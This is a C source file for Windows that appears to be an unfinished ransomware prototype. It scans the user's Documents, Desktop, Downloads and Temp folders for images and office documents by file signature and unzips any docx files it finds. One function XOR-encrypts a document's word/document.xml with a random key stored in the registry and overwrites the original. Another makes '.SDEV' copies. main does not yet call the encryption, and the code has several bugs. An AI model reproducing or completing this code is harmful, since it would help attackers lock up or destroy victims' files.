#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <Windows.h>
#include <io.h>
#include <conio.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include "unzip.h"
#define MAX_LEN 512

struct folder {
    char filename[MAX_LEN];
    char filepath[MAX_LEN];
};

int idx = 0;
struct folder documents[MAX_LEN];
struct folder desktop[MAX_LEN];
struct folder downloads[MAX_LEN];
struct folder temp[MAX_LEN];

void remove_after_last_slash(char* str) {
    char* last_slash = strrchr(str, '/'); 
    if (last_slash != NULL) {
        *(last_slash + 1) = '\0';
    }
}

void create_directory(char* dir,char* origin_path) {
    if (strcmp(dir, origin_path) == 1) {
        remove_after_last_slash(dir);
    }
    wchar_t wdir[MAX_LEN];
    MultiByteToWideChar(CP_UTF8, 0, dir, -1, wdir, MAX_LEN);
    CreateDirectoryW(wdir, NULL);
}

void copy_file(char* filepath, char* filename) {
    char orgin_file[MAX_LEN] = "";
    char enc_file[MAX_LEN] = "";
    char buffer[8];
    int buf;
    strcpy(orgin_file, filepath);
    strcat(orgin_file, filename);
    strcpy(enc_file, filepath);
    strtok(filename, ".");
    strcat(filename, ".SDEV");
    strcat(enc_file, filename);
    printf("\nOrigin : %s , Enc : %s\n", orgin_file, enc_file);
    FILE* readfile = fopen(orgin_file, "rb");
    FILE* outfile = fopen(enc_file, "wb");

    while ((buf = fread(buffer, 1, sizeof(buffer), readfile)) > 0) {
        fwrite(buffer, 1, buf, outfile);
    }

    fclose(readfile);
    fclose(outfile);
}

void document_encrypt(char* filepath, char* filename) {
    srand(time(NULL));
    int i, buf;
    HKEY hKey;
    CHAR reg_name[] = "KEY";
    CHAR reg_path[] = "Environment";
    DWORD dw = 0;
    char buffer[8];
    char key[8] = { 0, };
    char enc_filepath[MAX_LEN];
    char file_name[MAX_LEN];

    for (i = 0; i < 8; i++) {
        key[i] = rand() % 256;
    }

    RegCreateKeyExA(HKEY_CURRENT_USER, reg_path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    RegSetValueExA(hKey, reg_name, 0, REG_BINARY, (LPBYTE)&key, 8);
    strcpy(file_name, filename);
    strtok(file_name, ".");
    strcat(filepath, file_name);
    strcpy(enc_filepath, filepath);
    strcat(enc_filepath, "\\word\\enc_document.xml");
    strcat(filepath, "\\word\\document.xml");

    printf("\n%s\n", filepath);

    FILE* readfile = fopen(filepath, "rb");
    FILE* outfile = fopen(enc_filepath, "wb");

    while ((buf = fread(buffer, 1, sizeof(buffer), readfile)) > 0) {
        for (int i = 0; i < buf; i++) {
            buffer[i] = buffer[i] ^ key[i % 8];
        }
        fwrite(buffer, 1, buf, outfile);
    }

    fclose(readfile);
    fclose(outfile);

    if (remove(filepath) == -1) {
        printf("ERROR\t: Failed remove file\n");
    }

    if (rename(enc_filepath, filepath) == -1) {
        printf("ERROR\t: Failed rename file");
    }

}

int unzip(char* filename, char* filepath) {

    char zipFileName[MAX_LEN] = "";
    char unzipDir[MAX_LEN] = "";
    char filenamebuf[MAX_LEN] = "";
    
    strcpy(zipFileName, filepath);
    strcat(zipFileName, filename);
    strcpy(unzipDir, filepath);
    strcpy(filenamebuf, filename);
    strcat(unzipDir, strtok(filenamebuf, "."));
    create_directory(unzipDir, unzipDir);
    
    unzFile zipFile = unzOpen(zipFileName);
    if (zipFile == NULL) {
        printf("ERROR\t: Failed open %s\n", zipFileName);
        return 1;
    }

    if (unzGoToFirstFile(zipFile) != UNZ_OK) {
        printf("ERROR\t: Failed open\n");
        unzClose(zipFile);
        return 1;
    }

    char filename_inzip[MAX_LEN];
    unz_file_info file_info;
    while (unzGetCurrentFileInfo(zipFile, &file_info, filename_inzip, sizeof(filename_inzip), NULL, 0, NULL, 0) == UNZ_OK) {
        char file_path[MAX_LEN];
        sprintf(file_path, "%s/%s", unzipDir, filename_inzip);
        char* last_slash = strrchr(filename_inzip, '/');
        if (last_slash != NULL) {
            create_directory(file_path, unzipDir);
        }
        if (unzGoToNextFile(zipFile) != UNZ_OK) {
            break;
        }
    }
    unzClose(zipFile);

    unzOpen(zipFileName);
    while (unzGetCurrentFileInfo(zipFile, &file_info, filename_inzip, sizeof(filename_inzip), NULL, 0, NULL, 0) == UNZ_OK) {
        char file_path[MAX_LEN];
        sprintf(file_path, "%s/%s", unzipDir, filename_inzip);
        // 슬래시가 없는 경우 파일로 간주하고 파일 엔트리를 압축 해제
        if (unzOpenCurrentFile(zipFile) != UNZ_OK) {
            printf("ERROR\t: Failed open\n");
            unzClose(zipFile);
            return 1;
        }

        FILE* outfile = fopen(file_path, "wb");
        if (outfile == NULL) {
            printf("ERROR\t: Failed create %s\n", file_path);
            unzCloseCurrentFile(zipFile);
            unzClose(zipFile);
            return 1;
        }

        char buffer[8192];
        int read_bytes;
        while ((read_bytes = unzReadCurrentFile(zipFile, buffer, sizeof(buffer))) > 0) {
            fwrite(buffer, 1, read_bytes, outfile);
        }

        fclose(outfile);
        unzCloseCurrentFile(zipFile);

        if (unzGoToNextFile(zipFile) != UNZ_OK) {
            break;
        }
    }

    unzClose(zipFile);
    return 0;
}

// check_sig 0 : another file , 1 : png , 2 : jpg , 3 : doc , 4 : docx , 5 : hwp , 6 : txt
int check_sig(unsigned* hex) {
    if (hex[0] == 0x89 && hex[1] == 0x50 && hex[2] == 0x4e && hex[3] == 0x47 && hex[4] == 0x0d && hex[5] == 0x0a && hex[6] == 0x1A && hex[7] == 0x0a) {
        return 1;
    }
    else if (hex[0] == 0xff && hex[1] == 0xd8 && hex[2] == 0xff) {
        return 2;
    }
    else if (hex[0] == 0x0d && hex[1] == 0x44 && hex[2] == 0x4f && hex[3] == 0x43) {
        return 3;
    }
    else if (hex[0] == 0x50 && hex[1] == 0x4b && hex[2] == 0x03 && hex[3] == 0x04 && hex[4] == 0x14 && hex[5] == 0x00 && hex[6] == 0x06 && hex[7] == 0x00 && hex[8] == 0x08 && hex[9] == 0x00) {
        return 4;
    }
    else if (hex[0] == 0xd0 && hex[1] == 0xcf && hex[2] == 0x11 && hex[3] == 0xe0 && hex[4] == 0xa1 && hex[5] == 0xb1 && hex[6] == 0x1a && hex[7] == 0xe1) {
        return 5;
    }
    else if (1 == 0) {
        return 6;
    }
    else {
        return 0;
    }
}

int get_filesig(char* path, char* filename, int flag) {
    FILE* fp;
    unsigned buf[2048];
    char file_name[MAX_LEN] = "";
    char file_path[MAX_LEN] = "";
    int ch, i = 0;

    //file path + name
    strcpy(file_path, path);
    strcpy(file_name, filename);
    strcat(file_path, file_name);
    if (strcmp(file_name, ".") == 0 || strcmp(file_name, "..") == 0) {
        return 0;
    }

    //file open 
    printf("%s\n", file_path);
    fp = fopen(file_path, "rb");
    if (fp == NULL) {
        printf("ERROR\t: Cannot open file.\n\n");
        return 0;
    } else {
        while ((ch = fgetc(fp)) != EOF) {
            buf[i] = ch;
            i++;
            if (i == 2048) {
                break;
            }
        }
        fclose(fp);
        if (flag == 0 && check_sig(buf) > 0) {
            strcpy(documents[idx].filename, file_name);
            strcpy(documents[idx].filepath, path);
            idx++;
        }
        else if (flag == 1 && check_sig(buf) > 0) {
            strcpy(desktop[idx].filename, file_name);
            strcpy(desktop[idx].filepath, path);
            idx++;
        }
        else if (flag == 2 && check_sig(buf) > 0) {
            strcpy(downloads[idx].filename, file_name);
            strcpy(downloads[idx].filepath, path);
            idx++;
        }
        else if (flag == 3 && check_sig(buf) > 0) {
            strcpy(temp[idx].filename, file_name);
            strcpy(temp[idx].filepath, path);
            idx++;
        }
    }
}

void get_filelist(char* username, const char* folder_str, int flag) {
    struct _finddata_t fd; // _findnext 에러시 struct 추가
    intptr_t handle; // _findnext 에러시 long -> intptr_t로 변경
    int i = 0, result = 1;
    char* real_path = NULL;

    char path[MAX_LEN] = "C:\\Users\\";
    strcat(path, username);
    strcat(path, "\\");
    if (strcmp(folder_str, "Temp") == 0) {
        folder_str = "Local\\AppData\\Temp";
    }
    strcat(path, folder_str);
    strcat(path, "\\");
    strcat(path, "*.*");
    handle = _findfirst(path, &fd);
    if (handle == -1) {
        printf("No file here.\n");
    }
    else {
        idx = 0;
        while (result != -1) {
            real_path = NULL;
            result = _findnext(handle, &fd);
            real_path = strtok(path, "*");
            get_filesig(real_path, fd.name, flag);
        }
        _findclose(handle);
        result = 1;
    }
}

int main()
{
    DWORD dwsize = MAX_LEN;
    char strUserName[MAX_LEN] = { 0 };
    int i = 0;
    int nError = GetUserNameA(strUserName, &dwsize);
    if (!nError) {
        printf("GetUserNameA function is ERROR\n");
        return -1;
    }

    get_filelist(strUserName, "Documents", 0);
    get_filelist(strUserName, "Desktop", 1);
    get_filelist(strUserName, "Downloads", 2);
    get_filelist(strUserName, "Temp", 3);

    for (i = 0; i < idx; i++) {
        printf("Documents : %s\t Desktop : %s\t Downloads : %s\t Temp : %s\n", documents[i].filename, desktop[i].filename, downloads[i].filename, temp[i].filename);
    }
    for (i = 0; i < idx; i++) {
        if (strstr(documents[i].filename, "docx") != NULL) {
            unzip(documents[i].filename,documents[i].filepath);
        }
        if (strstr(desktop[i].filename, "docx") != NULL) {
            unzip(desktop[i].filename, desktop[i].filepath);
        }
        if (strstr(downloads[i].filename, "docx") != NULL) {
            unzip(downloads[i].filename, downloads[i].filepath);
        }
        if (strstr(temp[i].filename, "docx") != NULL) {
            unzip(temp[i].filename, temp[i].filepath);
        }
    }

}